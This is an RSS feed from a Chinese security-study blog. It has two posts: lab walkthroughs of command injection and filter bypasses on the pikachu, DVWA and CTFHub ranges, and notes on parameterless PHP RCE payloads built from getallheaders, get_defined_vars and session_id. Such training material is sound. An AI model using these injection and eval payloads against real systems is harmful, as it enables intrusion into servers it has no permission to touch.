<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>RCE on 美咕噜的小站</title>
        <link>https://0d000721999.github.io/tags/rce/</link>
        <description>Recent content in RCE on 美咕噜的小站</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>无敌可爱美咕噜</copyright>
        <lastBuildDate>Thu, 10 Oct 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://0d000721999.github.io/tags/rce/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>RCE</title>
        <link>https://0d000721999.github.io/p/rce/</link>
        <pubDate>Thu, 10 Oct 2024 00:00:00 +0000</pubDate>
        
        <guid>https://0d000721999.github.io/p/rce/</guid>
        <description>&lt;img src="https://0d000721999.github.io/p/rce/1.jpg" alt="Featured image of post RCE" /&gt;&lt;h1 id=&#34;rce&#34;&gt;RCE
&lt;/h1&gt;&lt;p&gt;远程代码执行：Remote Code Execute&lt;/p&gt;
&lt;p&gt;远程命令执行：Remote Command Execute&lt;/p&gt;
&lt;h2 id=&#34;php-rce函数&#34;&gt;php RCE函数
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://0d000721999.github.io/p/rce/image-20241230235941100.png&#34;
	width=&#34;1184&#34;
	height=&#34;533&#34;
	srcset=&#34;https://0d000721999.github.io/p/rce/image-20241230235941100_hu5657760566976634613.png 480w, https://0d000721999.github.io/p/rce/image-20241230235941100_hu2497268728995592588.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20241230235941100&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;222&#34;
		data-flex-basis=&#34;533px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://0d000721999.github.io/p/rce/image-20241230235955702.png&#34;
	width=&#34;1180&#34;
	height=&#34;533&#34;
	srcset=&#34;https://0d000721999.github.io/p/rce/image-20241230235955702_hu12852007950238668343.png 480w, https://0d000721999.github.io/p/rce/image-20241230235955702_hu12058876961730497757.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20241230235955702&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;221&#34;
		data-flex-basis=&#34;531px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;命令拼接符号&#34;&gt;命令拼接符号
&lt;/h2&gt;&lt;h3 id=&#34;windows&#34;&gt;windows
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://0d000721999.github.io/p/rce/image-20241231000327050.png&#34;
	width=&#34;1209&#34;
	height=&#34;285&#34;
	srcset=&#34;https://0d000721999.github.io/p/rce/image-20241231000327050_hu12572741454216855563.png 480w, https://0d000721999.github.io/p/rce/image-20241231000327050_hu1442366815001371552.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20241231000327050&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;424&#34;
		data-flex-basis=&#34;1018px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;linux&#34;&gt;linux
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://0d000721999.github.io/p/rce/image-20241231000352140.png&#34;
	width=&#34;1234&#34;
	height=&#34;305&#34;
	srcset=&#34;https://0d000721999.github.io/p/rce/image-20241231000352140_hu9061872699129298900.png 480w, https://0d000721999.github.io/p/rce/image-20241231000352140_hu7982302406228188647.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20241231000352140&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;404&#34;
		data-flex-basis=&#34;971px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;pikachu靶场练习&#34;&gt;pikachu靶场练习
&lt;/h2&gt;&lt;h3 id=&#34;ping&#34;&gt;ping
&lt;/h3&gt;&lt;p&gt;直接在ip后&amp;amp;加命令&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://0d000721999.github.io/p/rce/image-20241231001329346.png&#34;
	width=&#34;943&#34;
	height=&#34;438&#34;
	srcset=&#34;https://0d000721999.github.io/p/rce/image-20241231001329346_hu11312754832303229745.png 480w, https://0d000721999.github.io/p/rce/image-20241231001329346_hu1782129143993533474.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20241231001329346&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;215&#34;
		data-flex-basis=&#34;516px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;eval&#34;&gt;eval
&lt;/h3&gt;&lt;p&gt;用system(&amp;lsquo;ipconfig&amp;rsquo;)或者phpinfo()测试&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://0d000721999.github.io/p/rce/image-20241231001813066.png&#34;
	width=&#34;1678&#34;
	height=&#34;404&#34;
	srcset=&#34;https://0d000721999.github.io/p/rce/image-20241231001813066_hu14397101115982465118.png 480w, https://0d000721999.github.io/p/rce/image-20241231001813066_hu16205724578640588305.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20241231001813066&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;415&#34;
		data-flex-basis=&#34;996px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;dvwa的rce&#34;&gt;DVWA的RCE
&lt;/h2&gt;&lt;h3 id=&#34;low&#34;&gt;low
&lt;/h3&gt;&lt;p&gt;跟pikachu一样直接加&amp;amp;&lt;/p&gt;
&lt;h3 id=&#34;medium&#34;&gt;medium
&lt;/h3&gt;&lt;p&gt;因为平台是Windows，而靶场过滤的是Linux连接符，所以跟上面一样&lt;/p&gt;
&lt;h3 id=&#34;high&#34;&gt;high
&lt;/h3&gt;&lt;p&gt;查看源码管道符|后有空格&lt;/p&gt;
&lt;p&gt;我们不加空格直接拼接&lt;/p&gt;
&lt;h2 id=&#34;ctfhub练习&#34;&gt;ctfhub练习
&lt;/h2&gt;&lt;h3 id=&#34;eval执行&#34;&gt;eval执行
&lt;/h3&gt;&lt;p&gt;蚁剑连接，右键打开终端&lt;/p&gt;
&lt;p&gt;然后ls /根目录下就有flag&lt;/p&gt;
&lt;h3 id=&#34;命令注入-无过滤&#34;&gt;命令注入-无过滤
&lt;/h3&gt;&lt;p&gt;要求输入ip,没有过滤&lt;/p&gt;
&lt;p&gt;直接输入127.0.0.1;ls查看目录下文件&lt;/p&gt;
&lt;p&gt;有一个php文件，cat查看没东西&lt;/p&gt;
&lt;p&gt;直接转base64编码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1;cat xxx.php|base64
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;然后解码得到flag&lt;/p&gt;
&lt;h3 id=&#34;命令注入-过滤cat&#34;&gt;命令注入-过滤cat
&lt;/h3&gt;&lt;p&gt;改为less就行了&lt;/p&gt;
&lt;p&gt;其他命令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat 由第一行开始显示内容，并将所有内容输出
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tac 从最后一行倒序显示内容，并将所有内容输出
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;more 根据窗口大小，一页一页的现实文件内容
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;head 只显示头几行
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tail 只显示最后几行
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nl 类似于cat -n，显示时输出行号
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tailf 类似于tail -f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;命令注入-过滤空格&#34;&gt;命令注入-过滤空格
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;使用$IFS$9、%09、&amp;lt;、&amp;gt;、&amp;lt;&amp;gt;、{,}、%20、${IFS}、${IFS}来代替空格
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;命令注入-过滤命令分隔符&#34;&gt;命令注入-过滤命令分隔符
&lt;/h3&gt;&lt;p&gt;cd跳目录再cat，或者%0a代替目录分隔符/(在url里面输入)&lt;/p&gt;
&lt;h3 id=&#34;过滤运算符&#34;&gt;过滤运算符
&lt;/h3&gt;&lt;p&gt;其实前面要base64是因为源码被注释了&lt;/p&gt;
&lt;p&gt;所以我们正常cat flag然后查看源码&lt;/p&gt;
&lt;h3 id=&#34;综合过滤&#34;&gt;综合过滤
&lt;/h3&gt;&lt;p&gt;flag过滤用f***绕过&lt;/p&gt;
&lt;p&gt;cat改为more&lt;/p&gt;
&lt;p&gt;;用%0a&lt;/p&gt;
&lt;p&gt;然后跟上面一样构造payload到url里面&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1%0acd${IFS}f***_is_here${IFS}%0amore${IFS}f***_61177426640.php
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;防御&#34;&gt;防御
&lt;/h2&gt;&lt;p&gt;1、尽量不要使用命令执行的函数&lt;/p&gt;
&lt;p&gt;2、如果必须使用，需要做白名单处理&lt;/p&gt;
&lt;p&gt;3、用正则表达式对用户输入的内容进行处理&lt;/p&gt;
&lt;p&gt;4、使用WAF&lt;/p&gt;
</description>
        </item>
        <item>
        <title>无参RCE</title>
        <link>https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/</link>
        <pubDate>Thu, 10 Oct 2024 00:00:00 +0000</pubDate>
        
        <guid>https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/</guid>
        <description>&lt;img src="https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/1.png" alt="Featured image of post 无参RCE" /&gt;&lt;h1 id=&#34;无参rce&#34;&gt;无参rce
&lt;/h1&gt;&lt;h2 id=&#34;1getallheaders&#34;&gt;1、getallheaders()
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;getallheaders()&lt;/code&gt;返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而&lt;code&gt;eval()&lt;/code&gt;要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好&lt;code&gt;implode()&lt;/code&gt;这个函数就能胜任。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;implode()&lt;/code&gt;能够直接将&lt;code&gt;getallheaders()&lt;/code&gt;返回的数组转化为字符串。&lt;/p&gt;
&lt;p&gt;可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?exp=eval(implode(getallheaders()));
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;2get_defined_vars&#34;&gt;2、get_defined_vars()
&lt;/h2&gt;&lt;p&gt;该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与&lt;code&gt;implode&lt;/code&gt;结合起来用。要用&lt;code&gt;var_dump()&lt;/code&gt;输出&lt;/p&gt;
&lt;p&gt;用GET传入的参数会被显示在数组中的第一位&lt;/p&gt;
&lt;p&gt;要返回数组的第一个值要用&lt;code&gt;current()&lt;/code&gt;函数可以返回数组中的单元且初始指针指向数组的第一个单元。因为GET方式传入的参数存在该二维数组中的第一个一维数组，所以我们可以通过这个函数将其取出来&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_defined_vars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;如果我们传值是这样：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?get=a&amp;amp;shell=phpinfo();
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;后面传入的&lt;code&gt;shell=phpinfo();&lt;/code&gt;出现在了第一个数组的最后。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;end()&lt;/code&gt;函数可以倒序，也就是说我们可以将命令写到后面的参数再调用函数，执行shell命令&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_defined_vars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())));&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;phpinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;3session_id&#34;&gt;3、session_id()
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;session_id()&lt;/code&gt;可以用来获取/设置当前会话 ID。
那么可以用这个函数来获取cookie中的&lt;code&gt;phpsessionid&lt;/code&gt;了，并且这个值我们是可控的&lt;/p&gt;
&lt;p&gt;文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号)&lt;/p&gt;
&lt;p&gt;解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?exp=eval(hex2bin(session_id(session_start())));
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;或者?exp=eval(session_start();system(hex2bin(session_id())));
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;执行的命令bp写入16进制解析&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hex(&amp;#34;phpinfo();&amp;#34;)=706870696e666f28293b
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;getchwd() 函数返回当前工作目录。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scandir() 函数返回指定目录中的文件和目录的数组。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dirname() 函数返回路径中的目录部分。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chdir() 函数改变当前的目录。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;readfile() 输出一个文件。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;current() 返回数组中的当前单元, 默认取第一个值。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pos() current() 的别名。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;next() 函数将内部指针指向数组中的下一个元素，并输出。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;end() 将内部指针指向数组中的最后一个元素，并输出。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;array_slice() 函数在数组中根据条件取出一段值，并返回。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;array_reverse() 函数返回翻转顺序的数组。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chr() 函数从指定的 ASCII 值返回字符。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hex2bin() — 转换十六进制字符串为二进制字符串。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;localeconv() 函数返回一包含本地数字及货币格式信息的数组。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        
    </channel>
</rss>
